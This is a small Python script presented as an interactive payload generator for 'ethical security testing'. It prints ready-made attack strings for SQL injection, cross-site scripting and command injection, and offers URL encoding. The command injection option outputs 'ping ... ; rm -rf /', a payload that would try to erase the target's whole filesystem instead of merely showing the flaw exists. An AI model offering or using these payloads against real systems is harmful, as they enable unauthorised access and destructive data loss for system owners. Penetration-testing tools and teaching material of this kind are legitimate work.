import urllib.parse

def generate_payload():
    """Interactive payload generator for ethical security testing."""
    print("Payload Generator")
    print("-----------------")
    print("1. SQL Injection Payload")
    print("2. XSS Payload")
    print("3. Command Injection Payload")
    print("4. URL Encoding")

    choice = input("Select a payload type: ")
    
    if choice == "1":
        payload = "' OR '1'='1 --"
        print(f"SQL Injection Payload: {payload}")
    elif choice == "2":
        payload = "<script>alert('XSS')</script>"
        print(f"XSS Payload: {payload}")
    elif choice == "3":
        payload = "ping -c 4 127.0.0.1; rm -rf /"
        print(f"Command Injection Payload: {payload}")
    elif choice == "4":
        raw_input = input("Enter text to encode: ")
        encoded_payload = urllib.parse.quote(raw_input)
        print(f"URL Encoded Payload: {encoded_payload}")
    else:
        print("Invalid choice.")

# Example usage
if __name__ == "__main__":
    generate_payload()